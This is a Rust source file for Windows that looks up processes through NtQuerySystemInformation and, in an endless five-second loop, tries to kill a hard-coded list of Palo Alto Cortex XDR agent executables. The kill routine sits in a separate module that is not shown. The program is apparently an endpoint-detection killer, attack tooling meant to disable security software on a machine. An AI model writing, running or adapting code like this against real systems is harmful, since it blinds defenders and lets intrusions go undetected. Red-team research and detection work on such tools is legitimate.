use std::{os::raw::c_void, ptr::null_mut, time::Duration};

use windows_sys::{
    Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
    Win32::{
        Foundation::STATUS_INFO_LENGTH_MISMATCH,
        System::WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
    },
};

mod kill;
use kill::kill_proc;

#[allow(non_snake_case)]
fn NT_SUCCESS(Status: i32) -> bool {
    Status >= 0
}

fn get_pid(proc_name: &str) -> u32 {
    let mut pid: u32 = 0;
    unsafe {
        let mut return_length: u32 = 0;
        let status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] NtQuerySystemInformation failed.");
            return pid;
        }

        let buffer_size = return_length as usize;
        let buffer: Vec<u8> = vec![0; buffer_size];

        let status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_ptr() as *mut c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if !NT_SUCCESS(status) {
            println!("[-] NtQuerySystemInformation failed.");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    &String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .to_string(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn main() {
    let targets = [
        "cortex-xdr-payload.exe",
        "cysandbox.exe",
        "cyserver.exe",
        "cyuserver.exe",
        "cywscsvc.exe",
        "tlaworker.exe",
    ];

    loop {
        for target in targets.iter() {
            let pid = get_pid(target);
            if pid != 0 {
                println!("[+] Found {target} with PID {pid}");
                if kill_proc(target.to_string(), pid) {
                    println!("[+] Successfully killed {target} with PID {pid}");
                } else {
                    println!("[-] Failed to kill {target} with PID {pid}");
                }
            } else {
                println!("[-] {target} not found.");
            }
        }
        std::thread::sleep(Duration::from_secs(5));
    }
}
